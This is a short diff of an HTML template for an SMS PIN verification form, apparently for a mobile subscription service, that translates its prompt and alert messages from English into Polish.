@@ -24,7 +24,7 @@
                 <p class="m-b">MSISDN:{{.phone}}</p>
                 <input class="fill_num m-b" id="pin" name="pin" placeholder="PIN : XXX" />
                 <input class="noexit" id="id" name="id" value="{{.id}}"/>
-                <p class="ver">Enter PIN receive in SMS</p>
+                <p class="ver">Wprowadź kod PIN otrzymany w SMS-ie</p>
                 <a type="button" class="unsub" id="ver">Verify</a>
             </form>
         </div>
@@ -33,13 +33,13 @@
 <script>
     $("#ver").click(function () {
         if ($("#pin").val() == "") {
-            alert("please input crecot pin code!")
+            alert("Proszę podać swój PIN!")
         } else {
             $("#form").submit();
         }
     });
     if ({{.error}} == "201"){
-        alert("Your Pin Code is wrong.Please check it!")
+        alert("Twój PIN jest nieprawidłowy. Spójrz!")
     }
 </script>
 </html>
